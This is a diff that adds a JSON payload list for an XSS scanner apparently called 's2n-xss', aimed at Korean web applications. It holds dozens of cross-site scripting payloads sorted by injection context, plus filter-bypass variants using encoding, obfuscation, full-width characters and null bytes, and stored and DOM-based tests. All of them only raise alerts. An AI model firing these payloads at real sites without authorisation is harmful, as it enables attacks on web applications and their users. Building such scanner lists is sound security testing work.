@@ -1,0 +1,152 @@
+
+{
+  "metadata": {
+    "scanner": "s2n-xss",
+    "notes" : "기본 페이로드: HTML, Attribute, JavaScript, URL 컨텍스트별 분류\n한국어 특화: EUC-KR, 전각문자(＜＞), 유니코드 정규화 우회\n필터 우회: 인코딩, 난독화, 공백 우회, Null byte 등\nStored XSS: 지속성 페이로드, 지연 실행",
+    "version": "1.0.0",
+    "description": "Context-aware XSS payloads optimized for Korean web applications",
+    "total_payloads": 85,
+    "author": "s2n Core Team"
+  },
+  "payloads": {
+    "html_context": {
+      "basic": [
+        "<script>alert('s2n-xss')</script>",
+        "<script>alert(1)</script>",
+        "<img src=x onerror=alert('s2n-xss')>",
+        "<svg onload=alert('s2n-xss')>",
+        "<body onload=alert('s2n-xss')>",
+        "<iframe src=javascript:alert('s2n-xss')>",
+        "<input onfocus=alert('s2n-xss') autofocus>",
+        "<select onfocus=alert('s2n-xss') autofocus>",
+        "<textarea onfocus=alert('s2n-xss') autofocus>",
+        "<details open ontoggle=alert('s2n-xss')>"
+      ],
+      "korean_specific": [
+        "<script>alert('테스트')</script>",
+        "<script>alert('한글XSS')</script>",
+        "<img src=x onerror=alert('한글')>",
+        "＜script＞alert('전각문자')＜/script＞",
+        "＜img src=x onerror=alert('전각')＞",
+        "<script>console.log('UTF-8테스트:가나다')</script>"
+      ],
+      "html5": [
+        "<video><source onerror=alert('s2n-xss')>",
+        "<audio src=x onerror=alert('s2n-xss')>",
+        "<marquee onstart=alert('s2n-xss')>",
+        "<keygen onfocus=alert('s2n-xss') autofocus>"
+      ]
+    },
+    "attribute_context": {
+      "double_quote": [
+        "\" onload=\"alert('s2n-xss')\"",
+        "\" onfocus=\"alert('s2n-xss')\" autofocus=\"",
+        "\" onclick=\"alert('s2n-xss')\"",
+        "\"><script>alert('s2n-xss')</script>"
+      ],
+      "single_quote": [
+        "' onload='alert(\"s2n-xss\")'",
+        "' onfocus='alert(\"s2n-xss\")' autofocus='",
+        "' onclick='alert(\"s2n-xss\")'",
+        "'><script>alert('s2n-xss')</script>"
+      ],
+      "no_quote": [
+        "onload=alert('s2n-xss')",
+        "onclick=alert('s2n-xss')",
+        "onfocus=alert('s2n-xss') autofocus"
+      ],
+      "href_src": [
+        "javascript:alert('s2n-xss')",
+        "javascript:void(alert('s2n-xss'))",
+        "data:text/html,<script>alert('s2n-xss')</script>",
+        "data:text/html;base64,PHNjcmlwdD5hbGVydCgnczJuLXhzcycpPC9zY3JpcHQ+"
+      ]
+    },
+    "javascript_context": {
+      "string_escape": [
+        "'-alert('s2n-xss')-'",
+        "\"-alert('s2n-xss')-\"",
+        "';alert('s2n-xss');//",
+        "\";alert('s2n-xss');//",
+        "</script><script>alert('s2n-xss')</script>"
+      ],
+      "variable_injection": [
+        "1;alert('s2n-xss')",
+        "1);alert('s2n-xss');(1",
+        "1});alert('s2n-xss');({a:1"
+      ]
+    },
+    "url_context": [
+      "javascript:alert('s2n-xss')",
+      "javascript:void(alert('s2n-xss'))",
+      "javascript:%61%6c%65%72%74%28%27%73%32%6e%2d%78%73%73%27%29",
+      "data:text/html,<script>alert('s2n-xss')</script>",
+      "data:text/html;base64,PHNjcmlwdD5hbGVydCgnczJuLXhzcycpPC9zY3JpcHQ+"
+    ]
+  },
+  "filter_bypass": {
+    "encoding": [
+      "%3Cscript%3Ealert('s2n-xss')%3C/script%3E",
+      "\\u003cscript\\u003ealert('s2n-xss')\\u003c/script\\u003e",
+      "\\x3cscript\\x3ealert('s2n-xss')\\x3c/script\\x3e",
+      "&lt;script&gt;alert('s2n-xss')&lt;/script&gt;",
+      "&#60;script&#62;alert('s2n-xss')&#60;/script&#62;",
+      "&#x3c;script&#x3e;alert('s2n-xss')&#x3c;/script&#x3e;"
+    ],
+    "obfuscation": [
+      "<ScRiPt>alert('s2n-xss')</sCrIpT>",
+      "<script>eval(String.fromCharCode(97,108,101,114,116,40,39,115,50,110,45,120,115,115,39,41))</script>",
+      "<script>eval(atob('YWxlcnQoJ3Mybi14c3MnKQ=='))</script>",
+      "<svg><script>alert&#40;'s2n-xss'&#41;</script>",
+      "<img src=x onerror=\"eval(String.fromCharCode(97,108,101,114,116,40,39,115,50,110,45,120,115,115,39,41))\">"
+    ],
+    "space_bypass": [
+      "<img/src=x/onerror=alert('s2n-xss')>",
+      "<img\tsrc=x\tonerror=alert('s2n-xss')>",
+      "<img\nsrc=x\nonerror=alert('s2n-xss')>",
+      "<svg/onload=alert('s2n-xss')>"
+    ],
+    "null_byte": [
+      "<script>alert('s2n-xss')\u0000</script>",
+      "<img src=x\u0000onerror=alert('s2n-xss')>"
+    ],
+    "comment_bypass": [
+      "<!--<script>alert('s2n-xss')</script>-->",
+      "<script><!--alert('s2n-xss')//--></script>"
+    ]
+  },
+  "korean_encoding_specific": {
+    "euc_kr_bypass": [
+      "<script>alert('EUC-KR테스트')</script>",
+      "%C5%D7%BD%BA%C6%AE<script>alert(1)</script>"
+    ],
+    "fullwidth_chars": [
+      "＜script＞alert('fullwidth')＜/script＞",
+      "＜img src=x onerror=alert('fullwidth')＞",
+      "＜svg onload=alert('fullwidth')＞"
+    ],
+    "unicode_normalization": [
+      "﹤script﹥alert('s2n-xss')﹤/script﹥",
+      "〈script〉alert('s2n-xss')〈/script〉"
+    ]
+  },
+  "stored_xss_payloads": {
+    "persistent": [
+      "<script>alert('s2n-stored-xss')</script>",
+      "<img src=x onerror=alert('s2n-stored-xss')>",
+      "<svg onload=alert('s2n-stored-xss')>",
+      "\"><script>alert('s2n-stored-xss')</script>"
+    ],
+    "delayed_execution": [
+      "<script>setTimeout(function(){alert('s2n-delayed-xss')},5000)</script>",
+      "<img src=x onerror=\"setTimeout(function(){alert('s2n-delayed-xss')},3000)\">"
+    ]
+  },
+  "dom_based_indicators": {
+    "sink_tests": [
+      "document.write('<img src=x onerror=alert(\"s2n-dom-xss\")>')",
+      "eval('alert(\"s2n-dom-xss\")')",
+      "innerHTML='<img src=x onerror=alert(\"s2n-dom-xss\")>'"
+    ]
+  }
+}
